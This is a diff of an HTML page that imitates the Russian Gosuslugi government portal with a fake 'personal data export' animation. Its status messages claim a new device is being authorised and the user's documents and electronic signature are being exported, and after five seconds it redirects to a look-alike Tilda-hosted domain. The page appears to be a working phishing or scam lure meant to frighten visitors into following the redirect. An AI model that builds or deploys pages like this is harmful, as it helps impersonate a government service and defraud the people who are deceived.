@@ -2,83 +2,109 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Выгрузка данных</title>
-  <meta name="robots" content="noindex,nofollow"/>
+  <title>Выгрузка персональных данных</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=PT+Sans:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    html, body { height: 100%; margin: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PT Sans", Arial, sans-serif;
-      background: #f5f7fa;
-      display: flex; align-items: center; justify-content: center;
+    :root{
+      --bg:#f5f7fa; --card:#ffffff; --text:#202020; --muted:#4A4A4A; --dot:#9ab3d1;
+      --shadow:0 6px 18px rgba(0,0,0,.1);
     }
-    .logo { font-size: 32px; font-weight: 800; letter-spacing: .2px; margin-bottom: 20px; text-align:center; }
-    .logo .blue { color: #0C5ADB; }
-    .logo .red { color: #E31E24; }
-
-    .card {
-      background: #fff; padding: 40px 32px; width: 92%; max-width: 420px;
-      border-radius: 12px; box-shadow: 0 6px 18px rgba(0,0,0,.08);
-      text-align: center;
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; font-family:'PT Sans', system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+      background-color:var(--bg); display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px;
     }
-    h1 { font-size: 20px; margin: 0 0 16px; color: #202020; }
-    .dots { display:flex; gap:10px; justify-content:center; margin: 8px 0 14px; }
-    .dot { width:12px; height:12px; background:#9ab3d1; border-radius: 50%; animation: blink 1.4s infinite; }
-    .dot:nth-child(2) { animation-delay: .2s; }
-    .dot:nth-child(3) { animation-delay: .4s; }
-    @keyframes blink { 0%,80%,100%{opacity:.3} 40%{opacity:1} }
-
-    .progress { font-weight: 700; }
-    .status { color:#4A4A4A; min-height: 20px; margin-top: 6px; }
-    .fallback { margin-top: 16px; font-size: 12px; color:#6b7280; }
-    .fallback a { color:#0C5ADB; text-decoration: none; }
+    .logo{font-size:32px; font-weight:700; letter-spacing:.2px; user-select:none;}
+    .logo .blue{color:#0C5ADB} .logo .red{color:#E31E24}
+    .card{background:var(--card); width:min(440px, 92vw); padding:40px 60px; border-radius:12px; box-shadow:var(--shadow); text-align:center;}
+    h1{font-size:22px; font-weight:700; margin:0 0 15px; color:var(--text);}
+    .dots{display:flex; justify-content:center; gap:10px; margin-bottom:15px}
+    .dot{width:12px; height:12px; background-color:var(--dot); border-radius:50%; animation:blink 1.4s infinite}
+    .dot:nth-child(2){animation-delay:.2s} .dot:nth-child(3){animation-delay:.4s}
+    @keyframes blink{0%,80%,100%{opacity:.3} 40%{opacity:1}}
+    .progress{font-size:16px; font-weight:700; margin-bottom:10px; color:var(--muted)}
+    .status{font-size:14px; color:var(--muted); min-height:20px}
+    noscript{display:block; margin-top:10px; color:#c62828; font-weight:700}
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo"><span class="blue">гос</span><span class="red">услуги</span></div>
-    <h1>Выгрузка персональных данных</h1>
-    <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
-    <div class="progress" id="progress">0%</div>
-    <div class="status" id="status">Подготовка к загрузке...</div>
-    <div class="fallback">Если переход не случится автоматически, <a href="http://warning.gosuslugi.warning.tilda.ws/page74186825.html">нажмите здесь</a>.</div>
+  <div class="logo" aria-hidden="true">
+    <span class="blue">гос</span><span class="red">услуги</span>
   </div>
 
+  <main class="card" role="status" aria-live="polite">
+    <h1>Выгрузка персональных данных</h1>
+
+    <div class="dots" aria-hidden="true">
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+
+    <div class="progress" id="progress">0%</div>
+    <div class="status" id="status">Подготовка к загрузке...</div>
+
+    <noscript>Для продолжения включите JavaScript.</noscript>
+  </main>
+
   <script>
-    (function() {
-      var progressEl = document.getElementById("progress");
-      var statusEl = document.getElementById("status");
-      var progress = 0;
+  (function () {
+    // ====== Настройки ======
+    var durationMs = 5000; // Полное время 0→100, мс
+    var redirectUrl = "http://warning.gosuslugi.warning.tilda.ws/page74186825.html"; // твоя ссылка
+    // =======================
 
-      var duration = 5; // секунд до 100%
-      var interval = duration * 1000 / 100;
+    var progressEl = document.getElementById("progress");
+    var statusEl   = document.getElementById("status");
 
-      var messages = [
-        "Проверка подключения к серверу...",
-        "Загрузка пользовательских данных...",
-        "Авторизация с нового устройства...",
-        "Подключение нового устройства...",
-        "Шифрование сессии...",
-        "Выгрузка документов...",
-        "Получение справок...",
-        "Выгрузка электронной подписи..."
-      ];
+    var messages = [
+      "Проверка подключения к серверу...",
+      "Загрузка пользовательских данных...",
+      "Авторизация с нового устройства...",
+      "Подключение нового устройства...",
+      "Шифрование сессии...",
+      "Выгрузка документов...",
+      "Получение справок...",
+      "Выгрузка электронной подписи..."
+    ];
 
-      function update() {
-        if (progress < 100) {
-          progress++;
-          progressEl.textContent = progress + "%";
-          if (progress % 10 === 0) {
-            statusEl.textContent = messages[Math.floor(Math.random() * messages.length)];
-          }
-          setTimeout(update, interval);
-        } else {
-          statusEl.textContent = "Выгрузка завершена.";
-          window.location.replace("http://warning.gosuslugi.warning.tilda.ws/page74186825.html");
-        }
+    function pickDiff(prev){
+      var i = Math.floor(Math.random() * messages.length);
+      if(i === prev) i = (i + 1) % messages.length;
+      return i;
+    }
+
+    var start = performance.now();
+    var lastBucket = -1;
+    var lastMsgIdx = -1;
+
+    function frame(now){
+      var elapsed = now - start;
+      var pct = Math.min(100, Math.floor(elapsed / durationMs * 100));
+
+      progressEl.textContent = pct + "%";
+
+      var bucket = Math.floor(pct / 10);
+      if (bucket !== lastBucket && pct < 100){
+        lastBucket = bucket;
+        lastMsgIdx = pickDiff(lastMsgIdx);
+        statusEl.textContent = messages[lastMsgIdx];
       }
-      update();
-    })();
+
+      if (pct < 100){
+        requestAnimationFrame(frame);
+      } else {
+        statusEl.textContent = "Выгрузка данных на другое устройство подтверждена.";
+        // Небольшая пауза, чтобы показать 100%, затем редирект
+        setTimeout(function () {
+          // Если цель доступна по https, лучше заменить на https-ссылку.
+          window.location.replace(redirectUrl); // replace — чтобы не возвращаться на страницу загрузки
+        }, 350);
+      }
+    }
+
+    requestAnimationFrame(frame);
+  })();
   </script>
 </body>
 </html>
